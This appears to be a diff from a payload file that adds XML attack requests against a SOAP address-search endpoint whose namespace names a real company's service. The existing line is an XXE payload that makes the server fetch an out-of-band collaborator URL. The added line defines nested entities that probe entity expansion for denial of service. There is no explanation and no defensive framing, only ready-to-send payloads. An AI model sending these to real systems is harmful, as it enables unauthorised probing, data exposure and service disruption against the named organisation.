@@ -9,3 +9,5 @@
 
 
 <?xml version="1.0"?><!DOCTYPE soapenv:Envelope [<!ENTITY xxe SYSTEM "http://9isshp4d9od0dextuozz16bqdhj87zvo.oastify.com/xxe/xxe">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://suncorp.com.au/services/address/wsdl/0"><soapenv:Header/><soapenv:Body><ns:SearchRequest><CountryCode>AUS</CountryCode><Search>&xxe;</Search><Datasource>PAF</Datasource></ns:SearchRequest></soapenv:Body></soapenv:Envelope>
+
+<?xml version="1.0"?><!DOCTYPE soapenv:Envelope [<!ENTITY a "0123456789ABCDEF"><!ENTITY b "&a;&a;&a;&a;">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://suncorp.com.au/services/address/wsdl/0"><soapenv:Header/><soapenv:Body><ns:SearchRequest><CountryCode>AUS</CountryCode><Search>&b;</Search><Datasource>PAF</Datasource></ns:SearchRequest></soapenv:Body></soapenv:Envelope>
